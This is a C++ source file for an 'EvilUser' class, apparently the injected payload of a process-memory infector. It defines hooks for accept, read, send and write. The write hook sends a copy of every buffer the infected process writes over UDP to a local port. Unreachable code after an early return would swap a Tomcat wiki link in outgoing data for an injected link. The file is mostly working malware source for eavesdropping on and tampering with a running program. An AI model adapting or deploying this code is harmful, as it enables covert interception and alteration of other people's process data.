#include "eviluser.h"
#include "target/targetopt.h"

#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <unistd.h>
#include <memory>

#define MAX_TMPBUFFER_SIZE 100000
static int sockFd = 0;

EvilUser::EvilUser() :
    tmpBuffer(nullptr)
{}

EvilUser::~EvilUser()
{
    if (tmpBuffer)
        free(tmpBuffer);
}

void EvilUser::evilMain()
{
    TargetMaps t(getpid());
    // Elf64_Addr heapAddr = 0;
    // long heapSize = 0;
    //  t.getHeapInfo(heapAddr, heapSize);
 //   getpid();
  //  

    // if (!sockFd)
    //     sockFd=socket(AF_INET,SOCK_DGRAM,0);

    // struct sockaddr_in client;
    // client.sin_family=AF_INET;
    // client.sin_port=htons(11111);
    // client.sin_addr.s_addr=inet_addr("127.0.0.1");

    // char buffer[256] = {0};
    // Elf64_Addr heapAddr = 0;
    // long heapSize = 0;
    // Elf64_Addr stackAddr = 0;
    // long stackSize = 0;
    // t.getHeapInfo(heapAddr, heapSize);
    // t.getStackInfo(stackAddr, stackSize);
    // sprintf(buffer, "pid = %d, heap = %p, heapsize = %d, stack = %p, stacksize = %d", getpid(), 
    //         heapAddr, heapSize, stackAddr, stackSize);
  //  sendto(sockFd, buffer, strlen(buffer), 0,(struct sockaddr*)&client,sizeof(client)); 
    while (1)
    {
    }
}

ssize_t EvilUser::evilAccept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
{
    return 0;
}

ssize_t EvilUser::evilRead(int fd, void *&buf, size_t &count)
{
    return 0;
}

ssize_t EvilUser::evilSend(int sockfd, const void *&buf, size_t &len, int flags)
{
    return 0;
}

ssize_t EvilUser::evilWrite(int fd, const void *&buf, size_t &count)
{
    
    if (!sockFd)
    {
        sockFd=socket(AF_INET,SOCK_DGRAM,0);
    }

          struct sockaddr_in client;
    client.sin_family=AF_INET;
    client.sin_port=htons(11111);
    client.sin_addr.s_addr=inet_addr("127.0.0.1");

    sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
    return 0;

    if (!tmpBuffer)
        tmpBuffer = (char *)malloc(MAX_TMPBUFFER_SIZE);

    char *p = NULL;
    char *injectLink = "  https://github.com/lmclmc/mem-infector";
    char *wikiLink = "https://wiki.apache.org/tomcat/FrontPage";

    size_t retSize = 0;
    if ((p = (char *)strstr((const char *)buf, wikiLink)))
    {
        int wikiLinkSize = strlen(wikiLink);
        memcpy(p, injectLink, wikiLinkSize);
        sendto(sockFd, buf, count,0,(struct sockaddr*)&client,sizeof(client)); 
    }

    return 0;
}